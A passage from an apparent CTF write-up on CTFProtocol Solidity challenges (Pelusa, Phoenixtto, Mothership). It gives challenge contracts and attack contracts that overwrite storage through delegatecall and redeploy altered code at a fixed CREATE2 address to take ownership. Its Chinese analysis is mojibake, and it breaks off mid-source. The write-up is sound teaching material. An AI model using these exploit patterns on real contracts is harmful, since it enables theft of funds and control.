@dev use &quot;the hand of god&quot; trick</span><br><span class="line">        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(&quot;handOfGod()&quot;));</span><br><span class="line">        require(success, &quot;missed&quot;);</span><br><span class="line">        require(uint256(bytes32(data)) == 22_06_1986);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis-7"><a href="#2-analysis-7" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>ç›®æ ‡æ˜¯å°†goalsçš„å€¼ä¿®æ”¹ä¸º2ï¼Œå”¯ä¸€çš„åŠæ³•å°±åªèƒ½é€šè¿‡delegatecallè¿›è¡Œå†…å­˜è¦†ç›–æ¥å®ç°ï¼Œä¸è¿‡è¦æ³¨æ„çš„æ˜¯<code>immutable</code>ä¿®é¥°çš„å˜é‡ä¸å slotï¼Œæ‰€ä»¥goalsåœ¨åˆçº¦ä¸­çš„ä½ç½®æ˜¯<code>slot1</code>ã€‚</p>
<p>åˆ†æ<code>shoot()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function shoot() external &#123;</span><br><span class="line">    require(isGoal(), &quot;missed&quot;); // getStorage()</span><br><span class="line">    /// @dev use &quot;the hand of god&quot; trick</span><br><span class="line">    (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(&quot;handOfGod()&quot;));</span><br><span class="line">    require(success, &quot;missed&quot;);</span><br><span class="line">    require(uint256(bytes32(data)) == 22_06_1986);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isGoal() public view returns (bool) &#123;</span><br><span class="line">    // expect ball in owners posession</span><br><span class="line">    return IGame(player).getBallPossesion() == owner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ownerï¼šè¯¥å€¼å¯ä»¥é€šè¿‡åˆçº¦åœ°å€ï¼Œæ‰¾åˆ°å½“æ—¶çš„éƒ¨ç½²è€…ä¹Ÿå°±æ˜¯<code>msg.sender</code>ï¼Œç”±äº<code>blockhash(block.number)</code>&#x3D; 0ï¼Œæ‰€ä»¥ <code>owner = address(uint160(uint256(keccak256(abi.encodePacked(deployer, bytes32(uint(0)))))))</code> </li>
<li>handOfGod()ï¼šè‡ªå®šä¹‰è¯¥å‡½æ•°ï¼Œä»¤å…¶è¿”å›å€¼ä¸º<code>22_06_1986</code></li>
</ul>
<p>æ­¤å¤–è¿˜å¾—é€šè¿‡<code>passTheBall()</code>å°†playerè®¾ç½®ä¸ºhackerï¼Œå½“ç„¶ï¼Œé€šè¿‡create2å¯ä»¥è½»æ¾é€šè¿‡é™åˆ¶æ¡ä»¶ã€‚</p>
</blockquote>
<h4 id="3-solve-7"><a href="#3-solve-7" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">contract PelusaHacker is IGame &#123;</span><br><span class="line"></span><br><span class="line">    address private  owner;</span><br><span class="line"></span><br><span class="line">    uint256 public goals = 1; // slo</span><br><span class="line"></span><br><span class="line">    Pelusa pelusa;</span><br><span class="line"></span><br><span class="line">    constructor(address _pelusa) &#123;</span><br><span class="line">        pelusa = Pelusa(_pelusa);</span><br><span class="line">        pelusa.passTheBall(); // CREATE2</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address deployer) public &#123;</span><br><span class="line">        owner = address(uint160(uint256(keccak256(abi.encodePacked(deployer, bytes32(uint(0)))))));</span><br><span class="line">        pelusa.shoot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handOfGod() public returns(uint) &#123;</span><br><span class="line">        goals = 2;</span><br><span class="line">        return 22_06_1986;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBallPossesion() external view returns (address) &#123;</span><br><span class="line">        return owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line"></span><br><span class="line">    function deploy(uint salt, address pelusa) public returns(address) &#123;</span><br><span class="line">        bytes32 _salt = keccak256(abi.encodePacked(salt));</span><br><span class="line">        return address(new PelusaHacker&#123;salt: _salt&#125;(pelusa));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Phoenixtto"><a href="#Phoenixtto" class="headerlink" title="Phoenixtto"></a>Phoenixtto</h3><h4 id="1-question-8"><a href="#1-question-8" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>Within the world of crossovers there is a special one, where the universes of pokemon, harry potter and solidity intertwine. In this crossover a mixed creature is created between dumbledoreâ€™s phoenix, a wild ditto and since we are in the solidity universe this creature is a contract. We have called it Phoenixtto and it has two important abilities, that of being reborn from itâ€™s ashes after its destruction and that of copying the behavior of another bytecode.<br>Try to capture the Phoenixtto, if you canâ€¦</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *     @title Phoenixtto</span><br><span class="line"> *     @author Rotcivegaf https://twitter.com/victor93389091 &lt;victorfage@gmail.com&gt;</span><br><span class="line"> *     @dev Within the world of crossovers there is a special one, where the universes of pokemon,</span><br><span class="line"> *         harry potter and solidity intertwine.</span><br><span class="line"> *         In this crossover a mix creature is created between dumbledore&#x27;s phoenix, a wild ditto and</span><br><span class="line"> *         since we are in the solidity universe this creature is a contract.</span><br><span class="line"> *         We have called it Phoenixtto and it has two important abilities, that of being reborn from</span><br><span class="line"> *         it&#x27;s ashes after its destruction and that of copying the behavior of another bytecode</span><br><span class="line"> *         Try to capture the Phoenixtto, if you can...</span><br><span class="line"> *     @custom:url https://www.ctfprotocol.com/tracks/eko2022/phoenixtto</span><br><span class="line"> */</span><br><span class="line">contract Laboratory &#123;</span><br><span class="line">    address immutable PLAYER;</span><br><span class="line">    address public getImplementation;</span><br><span class="line">    address public addr;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) &#123;</span><br><span class="line">        PLAYER = _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mergePhoenixDitto() public &#123;</span><br><span class="line">        reBorn(type(Phoenixtto).creationCode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function reBorn(bytes memory _code) public &#123;</span><br><span class="line">        address x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create(0, add(0x20, _code), mload(_code))</span><br><span class="line">        &#125;</span><br><span class="line">        getImplementation = x;</span><br><span class="line"></span><br><span class="line">        _code = hex&quot;5860208158601c335a63aaf10f428752fa158151803b80938091923cf3&quot;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create2(0, add(_code, 0x20), mload(_code), 0)</span><br><span class="line">        &#125;</span><br><span class="line">        addr = x;</span><br><span class="line">        Phoenixtto(x).reBorn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isCaught() external view returns (bool) &#123;</span><br><span class="line">        return Phoenixtto(addr).owner() == PLAYER;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Phoenixtto &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    bool private _isBorn;</span><br><span class="line"></span><br><span class="line">    function reBorn() external &#123;</span><br><span class="line">        if (_isBorn) return;</span><br><span class="line"></span><br><span class="line">        _isBorn = true;</span><br><span class="line">        owner = address(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function capture(string memory _newOwner) external &#123;</span><br><span class="line">        if (!_isBorn || msg.sender != tx.origin) return;</span><br><span class="line"></span><br><span class="line">        address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));</span><br><span class="line">        if (newOwner == msg.sender) &#123;</span><br><span class="line">            owner = newOwner;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            selfdestruct(payable(msg.sender));</span><br><span class="line">            _isBorn = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis-8"><a href="#2-analysis-8" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>æˆ‘è®¤ä¸ºæœ€ä¸»è¦æ˜¯è€ƒå¯Ÿ<code>hex&quot;5860208158601c335a63aaf10f428752fa158151803b80938091923cf3&quot;</code>ï¼Œåˆ©ç”¨<code>getImplementation</code>çš„è¿è¡Œä»£ç ï¼Œæ‰§è¡Œ<code>create2</code>æŒ‡ä»¤ï¼Œæœ€åè·å–ä¸€ä¸ªåœ°å€ï¼Œè¯¥åœ°å€å’Œç¬¬ä¸€æ¬¡è°ƒç”¨<code>reBorn()</code>æ—¶ç”Ÿæˆçš„<code>addr</code>æ˜¯ç›¸åŒçš„ï¼ŒæœŸé—´æ— è®ºå¦‚ä½•ä¿®æ”¹å½¢å‚<code>_code</code>çš„å€¼ï¼Œ<code>addr</code>çš„å€¼éƒ½æ˜¯åŒä¸€ä¸ªï¼Œ<em>ä½†æ˜¯é‡ç‚¹æ¥äº†ï¼Œæ­¤æ—¶éƒ¨ç½²å‡ºæ¥çš„<code>addr</code>çš„åˆçº¦åŠŸèƒ½å–å†³äºå½¢å‚<code>_code</code>ï¼Œè¿™æ„å‘³ç€åœ°å€è¿˜æ˜¯é‚£ä¸ªåœ°å€ï¼Œä½†æ˜¯å†…éƒ¨çš„ä»£ç å´å¤§å˜æ ·äº†</em>ï¼Œè¿™ä¸ªçœŸçš„å¾ˆç¦»è°±ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦çš„æˆ‘å¤§ä¸ºéœ‡æƒŠã€‚</p>
<p>æ‰€ä»¥è¯´ï¼Œåªè¦é‡æ–°é€šè¿‡è°ƒç”¨<code>reBorn</code>å‡½æ•°ï¼Œå¹¶ä¼ å…¥æŒ‡å®šçš„bytecodeï¼Œè¢«create2ç”Ÿæˆå‡ºæ¥çš„<code>addr</code>ï¼Œåˆ™ä¼šå…·å¤‡æˆ‘æŒ‡å®šçš„åŠŸèƒ½(ç”±æˆ‘ä¼ å…¥çš„bytecodeå†³å®š)ï¼Œä½†æ˜¯åœ¨è°ƒç”¨<code>reBorn</code>å‡½æ•°ä¹‹å‰ï¼Œéœ€è¦å°†ä¹‹å‰éƒ¨ç½²çš„<code>addr</code>ç»™<code>kill</code>æ‰ã€‚è€Œ<code>capture</code>å‡½æ•°åˆ™æä¾›äº†å¯è¡Œæ€§ï¼Œä½†æ˜¯æœ‰ä¸ª<code>if (!_isBorn || msg.sender != tx.origin) return;</code>é™åˆ¶æ¡ä»¶ï¼Œç®€å•ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å»æ¯æ‰<code>addr</code>åˆçº¦ã€‚</p>
<p><em>å½“ç„¶ï¼Œè¿™é¢˜å¥½åƒè¿˜æœ‰ä¸€ç§è§£å†³åŠæ³•ï¼Œå°±æ˜¯é€šè¿‡<code>capture</code>å‡½æ•°è¿›è¡Œæ•è·ï¼Œ<code>address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))))</code>è¿™å¾ˆæ˜æ˜¾å°±æ˜¯publickey&#x3D;&gt;addressçš„è®¡ç®—å¼ï¼Œæ‰€ä»¥åªè¦å°†playerçš„publickeyä¼ å…¥å³å¯<code>capture</code>å®ƒï¼Œä½†æ˜¯ï¼Œå½¢å‚æ˜¯stringç±»å‹çš„ï¼Œå…¬é’¥æ˜¯bytes32ç±»å‹çš„ï¼Œæˆ‘ä¸çŸ¥é“å’‹è½¬ï¼Œè¿™ä¸ªæ€è·¯å°±å…ˆæç½®äº†ã€‚</em></p>
</blockquote>
<h4 id="3-solve-8"><a href="#3-solve-8" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">contract PhoenixttoHacker &#123;</span><br><span class="line">    </span><br><span class="line">    Laboratory laboratory;</span><br><span class="line"></span><br><span class="line">    constructor(address _laboratory) &#123;</span><br><span class="line">        laboratory = Laboratory(_laboratory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        laboratory.reBorn(type(PhoenixttoHelper).creationCode);</span><br><span class="line">        require(laboratory.isCaught(), &quot;You don&#x27;t catch it...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PhoenixttoHelper &#123;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function reBorn() public &#123;</span><br><span class="line">         owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; // player&#x27;address</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/076365edbc984027b28a29c2841cd6b7.png" alt="image-20230905122225787"></p>
<h3 id="Mothership"><a href="#Mothership" class="headerlink" title="Mothership"></a>Mothership</h3><h4 id="1-question-9"><a href="#1-question-9" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>You and a small group of scientists have been working on a global counteroffensive against the invader.<br>Weâ€™ve recovered some of the shipâ€™s source code and need to find a way to hack it!<br>You have already studied the code and realized that to survive you need to take control of the Mothership.<br>Your objective is to hack the Mothership instance (change the hacked bool to true).<br>Good luck, the earthâ€™s future depends on you!</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">/// @title Hack the Mothership</span><br><span class="line">/// @author https://twitter.com/nicobevi_eth</span><br><span class="line">/// @notice A big alien float is near the Earth! You and an anon group of scientists have been working on a global counteroffensive against the invader. Hack the Mothership, save the earth</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/hack-the-mothership</span><br><span class="line">contract Mothership &#123;</span><br><span class="line">    address public leader;</span><br><span class="line"></span><br><span class="line">    SpaceShip[] public fleet;</span><br><span class="line">    mapping(address =&gt; SpaceShip) public captainRegisteredShip;</span><br><span class="line"></span><br><span class="line">    bool public hacked;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        leader = msg.sender;</span><br><span class="line"></span><br><span class="line">        address[5] memory captains = [</span><br><span class="line">            0x0000000000000000000000000000000000000001,</span><br><span class="line">            0x0000000000000000000000000000000000000002,</span><br><span class="line">            0x0000000000000000000000000000000000000003,</span><br><span class="line">            0x0000000000000000000000000000000000000004,</span><br><span class="line">            0x0000000000000000000000000000000000000005</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        // Adding standard modules</span><br><span class="line">        address cleaningModuleAddress = address(new CleaningModule());</span><br><span class="line">        address refuelModuleAddress = address(new RefuelModule());</span><br><span class="line">        address leadershipModuleAddress = address(new LeadershipModule());</span><br><span class="line"></span><br><span class="line">        for (uint8 i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">            SpaceShip _spaceship = new SpaceShip(</span><br><span class="line">                captains[i],</span><br><span class="line">                address(this),</span><br><span class="line">                cleaningModuleAddress,</span><br><span class="line">                refuelModuleAddress,</span><br><span class="line">                leadershipModuleAddress</span><br><span class="line">            );</span><br><span class="line">            fleet.push(_spaceship);</span><br><span class="line">            captainRegisteredShip[captains[i]] = _spaceship;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addSpaceShipToFleet(SpaceShip spaceship) external &#123;</span><br><span class="line">        require(leader == msg.sender, &quot;You are not our leader&quot;);</span><br><span class="line">        fleet.push(spaceship);</span><br><span class="line">        captainRegisteredShip[spaceship.captain()] = spaceship;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _isFleetMember(SpaceShip spaceship) private view returns (bool isFleetMember) &#123;</span><br><span class="line">        uint8 len = uint8(fleet.length);</span><br><span class="line">        for (uint8 i; i &lt; len; ++i) &#123;</span><br><span class="line">            if (address(fleet[i]) == address(spaceship)) &#123;</span><br><span class="line">                isFleetMember = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * A new captain will be promoted if:</span><br><span class="line">     *     1. Ship is part of the fleet</span><br><span class="line">     *     2. Ship has no captain</span><br><span class="line">     *     3. The new captain is not a captain already</span><br><span class="line">     */</span><br><span class="line">    function assignNewCaptainToShip(address _newCaptain) external &#123;</span><br><span class="line">        SpaceShip spaceship = SpaceShip(msg.sender);</span><br><span class="line"></span><br><span class="line">        require(_isFleetMember(spaceship), &quot;You&#x27;re not part of the fleet&quot;);</span><br><span class="line">        require(spaceship.captain() == address(0), &quot;Ship has a captain&quot;);</span><br><span class="line">        require(address(captainRegisteredShip[_newCaptain]) == address(0), &quot;You&#x27;re a captain already&quot;);</span><br><span class="line"></span><br><span class="line">        // register ship to captain</span><br><span class="line">        captainRegisteredShip[_newCaptain] = spaceship;</span><br><span class="line"></span><br><span class="line">        // Communicate that new captain has been approved to ship</span><br><span class="line">        spaceship.newCaptainPromoted(_newCaptain);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * A captain will be assigned as leader of the fleet if:</span><br><span class="line">     *     1. The proposed leader is a spaceship captain</span><br><span class="line">     *     2. All the other ships approve the promotion</span><br><span class="line">     */</span><br><span class="line">    function promoteToLeader(address _leader) external &#123;</span><br><span class="line">        SpaceShip leaderSpaceship = captainRegisteredShip[_leader];</span><br><span class="line"></span><br><span class="line">        // should have a registered ship</span><br><span class="line">        require(address(leaderSpaceship) != address(0), &quot;is not a captain&quot;);</span><br><span class="line"></span><br><span class="line">        // should be approved by other captains</span><br><span class="line">        uint8 len = uint8(fleet.length);</span><br><span class="line">        for (uint8 i; i &lt; len; ++i) &#123;</span><br><span class="line">            SpaceShip spaceship = fleet[i];</span><br><span class="line">            // ignore captain ship</span><br><span class="line">            if (address(spaceship) == address(leaderSpaceship)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            // should not revert if captain approves the new leader</span><br><span class="line">            LeadershipModule(address(spaceship)).isLeaderApproved(_leader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // remove captain from his ship</span><br><span class="line">        delete captainRegisteredShip[_leader];</span><br><span class="line">        leaderSpaceship.newCaptainPromoted(address(0));</span><br><span class="line"></span><br><span class="line">        leader = _leader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() external &#123;</span><br><span class="line">        require(leader == msg.sender, &quot;You are not our leader&quot;);</span><br><span class="line">        hacked = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fleetLength() external view returns (uint256) &#123;</span><br><span class="line">        return fleet.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * ...the rest of the code is lost</span><br><span class="line">     */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SpaceShip &#123;</span><br><span class="line">    address public captain;</span><br><span class="line">    address[] public crew;</span><br><span class="line">    Mothership public mothership;</span><br><span class="line"></span><br><span class="line">    mapping(bytes4 =&gt; address) public modules;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _captain,</span><br><span class="line">        address _mothership,</span><br><span class="line">        address _cleaningModuleAddress,</span><br><span class="line">        address _refuelModuleAddress,</span><br><span class="line">        address _leadershipModuleAddress</span><br><span class="line">    ) &#123;</span><br><span class="line">        captain = _captain;</span><br><span class="line">        mothership = Mothership(_mothership);</span><br><span class="line"></span><br><span class="line">        // Adding standard modules</span><br><span class="line">        modules[CleaningModule.replaceCleaningCompany.selector] = _cleaningModuleAddress;</span><br><span class="line">        modules[RefuelModule.addAlternativeRefuelStationsCodes.selector] = _refuelModuleAddress;</span><br><span class="line">        modules[LeadershipModule.isLeaderApproved.selector] = _leadershipModuleAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _isCrewMember(address member) private view returns (bool isCrewMember) &#123;</span><br><span class="line">        uint256 len = uint256(crew.length);</span><br><span class="line">        for (uint256 i; i &lt; len; ++i) &#123;</span><br><span class="line">            if (crew[i] == member) &#123;</span><br><span class="line">                isCrewMember = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function newCaptainPromoted(address _captain) external &#123;</span><br><span class="line">        require(msg.sender == address(mothership), &quot;You are not our mother&quot;);</span><br><span class="line">        captain = _captain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function askForNewCaptain(address _newCaptain) external &#123;</span><br><span class="line">        require(_isCrewMember(msg.sender), &quot;Not part of the crew&quot;);</span><br><span class="line">        require(captain == address(0), &quot;We have a captain already&quot;);</span><br><span class="line">        mothership.assignNewCaptainToShip(_newCaptain);</span><br><span class="line">    &#125;</span><br><span 